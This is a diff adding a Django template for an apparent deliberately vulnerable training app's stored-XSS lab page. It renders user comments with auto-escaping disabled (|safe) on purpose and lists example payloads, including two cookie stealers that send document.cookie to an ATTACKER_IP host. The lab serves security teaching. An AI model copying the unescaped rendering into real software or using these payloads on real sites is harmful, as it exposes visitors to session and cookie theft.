@@ -1,0 +1,50 @@
+{% extends "vuln_app/base.html" %}
+{% block title %}Comments - Stored XSS Lab{% endblock %}
+{% block content %}
+<div class="card">
+  <h2 style="color:#f0883e;"> Comments — Stored XSS Lab</h2>
+  <p>CWE-79 (Stored): Comment content is saved to DB and rendered with <code>|safe</code>.</p>
+  {% if product %}<p>Product: <strong>{{ product.name }}</strong></p>{% endif %}
+  <br>
+  <form method="POST">
+    {% csrf_token %}
+    <input type="text" name="author" placeholder="Your name">
+    <textarea name="content" rows="4"
+      placeholder="Leave a comment... (try: <script>alert('Stored-XSS')</script>)"></textarea>
+    <button type="submit">Post Comment</button>
+  </form>
+</div>
+<div class="card">
+  <h3 style="color:#58a6ff;">Comments ({{ comments.count }})</h3>
+  {% for c in comments %}
+  <div style="border-bottom: 1px solid #30363d; padding: 12px 0;">
+    <strong style="color:#f0883e;">{{ c.author }}</strong>
+    <small style="color:#8b949e;"> • {{ c.created }}</small>
+    <p>
+      <!--  VULNERABLE: |safe disables auto-escaping → Stored XSS -->
+      {{ c.content|safe }}
+    </p>
+  </div>
+  {% empty %}
+    <p style="color:#8b949e;">No comments yet. Be the first!</p>
+  {% endfor %}
+</div>
+<div class="card">
+  <h3 style="color:#58a6ff;">Stored XSS Payloads:</h3>
+  <table>
+    <tr><th>Payload (paste in content field)</th><th>Effect</th></tr>
+    <tr>
+      <td><code>&lt;script&gt;alert('Stored XSS by '+document.domain)&lt;/script&gt;</code></td>
+      <td>Executes for every visitor</td>
+    </tr>
+    <tr>
+      <td><code>&lt;script&gt;fetch('http://ATTACKER_IP:8888/?c='+document.cookie)&lt;/script&gt;</code></td>
+      <td>Persistent cookie stealer</td>
+    </tr>
+    <tr>
+      <td><code>&lt;img src=x onerror="this.src='http://ATTACKER_IP:8888/x?c='+btoa(document.cookie)"&gt;</code></td>
+      <td>Base64-encoded exfil</td>
+    </tr>
+  </table>
+</div>
+{% endblock %}
